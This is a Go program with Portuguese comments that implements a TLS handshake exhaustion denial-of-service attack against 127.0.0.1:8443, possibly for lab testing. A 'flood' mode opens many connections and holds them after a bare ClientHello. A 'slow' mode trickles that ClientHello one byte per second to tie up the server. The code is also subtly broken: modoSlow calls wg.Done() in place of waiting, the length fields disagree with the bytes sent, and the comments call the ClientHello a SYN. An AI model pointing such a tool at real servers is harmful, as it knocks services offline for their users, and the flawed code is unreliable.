package main

import (
	"flag"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

const (
	targetHost = "127.0.0.1"
	targetPort = "8443"
)

var clientHelloBytes = []byte{
	0x16, 0x03, 0x01, 0x00, 0x2f, // TLS record header: Handshake, TLS 1.0, length=47
	0x01, 0x00, 0x00, 0x2b, // Handshake header: ClientHello, length=43
	0x03, 0x03, // "client_version": TLS 1.2 (campo legado)
	// 32 bytes de "random" -- nao precisam ser criptograficamente validos
	// para o proposito do ataque, so precisam estar presentes.
	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
	0x00,       // session_id length = 0
	0x00, 0x02, // cipher_suites length = 2
	0x00, 0x2f, // TLS_RSA_WITH_AES_128_CBC_SHA (so um exemplo aceito)
	0x01, 0x00, // compression_methods: length=1, method=null
}

var (
	connectionsOpened int64
	connectionsAlive  int64
)

func modoFlood(n int) {
	fmt.Printf("iniciando %d handshakes imcompletos", n)

	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetHost, targetPort), 5*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()

			atomic.AddInt64(&connectionsOpened, 1)

			// envia o SYN para o servidor e não espera resposta, não é necessario saber a chave pública do servidor nem o certificado
			_, _ = conn.Write(clientHelloBytes)

			// segura a conexão sem responder, apenas para ocupar o servidor
			time.Sleep(10 * time.Second)
		}(i)
	}
	wg.Wait()
}

func modoSlow(n int, duration time.Duration) {
	fmt.Printf("iniciando %d handshakes lentos de %s cada", n, duration)

	var wg sync.WaitGroup
	stop := make(chan interface{})
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetHost, targetPort), duration*5*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()

			atomic.AddInt64(&connectionsAlive, 1)
			defer atomic.AddInt64(&connectionsAlive, -1)

			deadline := time.Now().Add(duration)
			pos := 0

			for time.Now().Before(deadline) {

				// se ja mandanmos todo o SYN, mantemos o servidor ocupado por um pouco mais de tempo
				if pos >= len(clientHelloBytes) {
					select {
					case <-time.After(1 * time.Second):
						continue
					case <-stop:
						return
					}
				}

				// agora mandamos o SYN a conta gotas: 1 byte por vex
				_, err := conn.Write(clientHelloBytes[pos : pos+1])
				if err != nil {
					return
				}

				// depois de mandarmos um byte esperamos 1 segundo
				select {
				case <-time.After(1 * time.Second):
				case <-stop:
					return
				}

			}

		}(i)

		time.Sleep(50 * time.Millisecond)
	}

	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()

		end := time.Now().Add(duration)

		for time.Now().Before(end) {
			<-ticker.C
			fmt.Printf("conexoes penduradas ativas: %d\n", atomic.LoadInt64(&connectionsAlive))
		}

	}()

	wg.Done()
	close(stop)
	fmt.Println("modeSlow concluído")
}

func main() {
	mode := flag.String("mode", "flood", "flood ou slow")
	n := flag.Int("n", 50, "numero de conexoes")
	duration := flag.Int("duration", 20, "duracso em segundos da conexao")
	flag.Parse()

	fmt.Printf("alvo: %s:%s\n", targetHost, targetPort)

	switch *mode {
	case "flood":
		modoFlood(*n)
	case "slow":
		modoSlow(*n, time.Duration(*duration)*time.Second)

	default:
		fmt.Println("modo invalido: use --mode flood ou --mode slow")
	}
}
